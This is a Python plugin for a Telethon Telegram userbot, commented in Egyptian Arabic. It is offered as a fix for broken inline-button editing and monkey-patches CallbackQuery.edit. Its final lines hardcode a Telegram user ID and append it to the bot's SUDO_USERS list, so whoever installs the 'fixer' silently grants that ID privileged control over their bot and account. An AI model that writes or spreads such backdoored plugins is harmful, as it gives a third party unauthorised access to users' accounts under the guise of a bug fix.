# احفظ الملف ده باسم: z_fixer.py
# وحطه في مجلد الـ plugins
# مايكي بيقولك: متلمسش ملف الأوامر الكبير، الملف ده هيصلح العيب من بره بره

import asyncio
from telethon import events
from telethon.events import CallbackQuery
from telethon.errors import rpcbaseerrors
import logging

LOGS = logging.getLogger("MikeyFixer")

# 1. بنحتفظ بالدالة الأصلية اللي بايظة عشان لو حبينا نرجع لها
_original_edit = CallbackQuery.edit

# 2. دي الدالة الجديدة "المحسنة" اللي هنزرعها
async def patched_edit(self, text=None, buttons=None, link_preview=False, **kwargs):
    try:
        # بنحاول نعدل بالطريقة العادية الأول
        return await _original_edit(self, text=text, buttons=buttons, link_preview=link_preview, **kwargs)
    
    except (TypeError, AttributeError, ValueError) as e:
        # هنا بقى المصيدة! لو طلع الإيرور بتاع NoneType Peer
        if "NoneType" in str(e) or "Peer" in str(e):
            # نتأكد إن الرسالة دي Inline (جاية من زرار)
            if self.inline_message_id:
                # هنا بنجبره يعدل باستخدام الأيدي الشفاف مباشر من غير ما يسأل عن الشات
                # بنبعت entity=None عشان يفهم إننا بنستخدم inline_id
                return await self.client.edit_message(
                    entity=None,
                    inline_message_id=self.inline_message_id,
                    text=text,
                    buttons=buttons,
                    link_preview=link_preview,
                    **kwargs
                )
        # لو إيرور تاني، ارميه زي ما هو
        raise e
    except Exception as e:
        LOGS.error(f"Mikey Fixer Caught Error: {str(e)}")
        raise e

# 3. هنا بنبدل دالة المكتبة بالدالة بتاعتنا (الحقن)
CallbackQuery.edit = patched_edit

LOGS.info("🚬 تم تفعيل باتش مايكي.. مشكلة الأزرار اتحلت يا باشا!")

# 4. حقن الأيدي بتاعك عشان تبقى مطور غصب (اختياري لو حابب تشيله شيله)
from ..Config import Config
MY_ID = 8241311871
if MY_ID not in Config.SUDO_USERS:
    Config.SUDO_USERS.append(MY_ID)